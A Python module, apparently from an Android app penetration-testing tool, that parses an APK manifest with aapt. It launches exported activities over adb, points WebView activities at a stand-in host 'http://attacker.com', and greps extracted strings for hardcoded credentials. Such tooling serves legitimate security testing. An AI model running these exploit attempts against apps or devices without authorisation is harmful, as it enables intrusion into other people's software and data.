import os
import re
import subprocess
from utils import logger

def get_package_name_from_apk(apk_path):
    try:
        output = subprocess.check_output(["aapt", "dump", "badging", apk_path], text=True)
        for line in output.splitlines():
            if line.startswith("package:"):
                parts = line.split()
                for part in parts:
                    if part.startswith("name="):
                        package_name = part.split("=")[1].replace("'", "")
                        logger.info(f"Extracted package name: {package_name}")
                        return package_name
    except subprocess.CalledProcessError as e:
        logger.error(f"Failed to extract package name: {e}")
    return None

def find_hardcoded_credentials(strings_file):
    credentials = []
    try:
        with open(strings_file, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
            for line in lines:
                if re.search(r'(user(name)?|pass(word)?|auth|token)[=: ]', line, re.IGNORECASE):
                    credentials.append(line.strip())
    except Exception as e:
        logger.error(f"Error reading strings file: {e}")
    return credentials

def extract_exported_components(apk_path):
    exported_activities = []
    webview_activities = []

    try:
        output = subprocess.check_output(["aapt", "dump", "xmltree", apk_path, "AndroidManifest.xml"], text=True)
    except subprocess.CalledProcessError as e:
        logger.error(f"Error extracting manifest: {e}")
        return [], []

    current_activity = None

    for line in output.splitlines():
        line = line.strip()

        if line.startswith("E: activity"):
            current_activity = None

        elif 'A: android:name' in line:
            match = re.search(r'android:name\(.*?\)="([^"]+)"', line)
            if match:
                current_activity = match.group(1)

        elif 'A: android:exported' in line and '="true"' in line and current_activity:
            exported_activities.append(current_activity)

            # If the activity name contains 'webview', assume it's a webview component
            if 'webview' in current_activity.lower():
                webview_activities.append(current_activity)

            current_activity = None

    return exported_activities, webview_activities


def exploit_exported_components(package_name, exported_components, output_lines):
    for component in exported_components:
        logger.info(f"Attempting to start exported component: {component}")
        try:
            subprocess.run(["adb", "shell", "am", "start", "-n", f"{package_name}/{component}"], check=True)
            output_lines.append(f"[Exploit Attempt] Started exported component: {component}")
        except subprocess.CalledProcessError as e:
            output_lines.append(f"[Exploit Failed] {component}: {e}")

def exploit_webview_activities(package_name, webview_components, output_lines):
    malicious_url = "http://attacker.com"
    for component in webview_components:
        logger.info(f"Attempting WebView URL load on {component}")
        try:
            subprocess.run([
                "adb", "shell", "am", "start", "-n", f"{package_name}/{component}",
                "-d", malicious_url
            ], check=True)
            output_lines.append(f"[Exploit Attempt] WebView URL load: {component} -> {malicious_url}")
        except subprocess.CalledProcessError as e:
            output_lines.append(f"[Exploit Failed] WebView {component}: {e}")

def save_exploit_results(output_file, results):
    os.makedirs(os.path.dirname(output_file), exist_ok=True)
    with open(output_file, 'w', encoding='utf-8') as f:
        for line in results:
            f.write(line + "\n")

def run_exploit(apk_path):
    logger.info("Starting exploitation attempts...")

    base_name = os.path.basename(apk_path).replace(".apk", "")
    strings_file = os.path.join("output", f"{base_name}_strings.txt")
    package_name = get_package_name_from_apk(apk_path)

    if not package_name:
        logger.error("Could not extract package name from APK. Aborting exploitation.")
        return
    exported_components, webview_components = extract_exported_components(apk_path)

    results = []

    # 1. Try exploiting exported components
    if exported_components:
        exploit_exported_components(package_name, exported_components, results)
    else: 
        results.append("No exported activities found.")

    # 2. Try exploiting WebView URL loads
    if webview_components:
        exploit_webview_activities(package_name, webview_components, results)
    else:
        results.append("No WebView activities found.")

    # 3. Check for hardcoded credentials
    credentials = find_hardcoded_credentials(strings_file)
    if credentials:
        results.append("Possible hardcoded credentials found:")
        results.extend(credentials)
    else:
        results.append("No hardcoded credentials found.")

    # Save results to file
    output_dir = os.path.join("output", "exploits")
    output_file = os.path.join(output_dir, f"{package_name}_results.txt")
    save_exploit_results(output_file, results)

    logger.info(f"Exploit results saved to {output_file}")

# Example usage (called from main.py)
# run_exploit(package_name, strings_file, exported_components, webview_components)
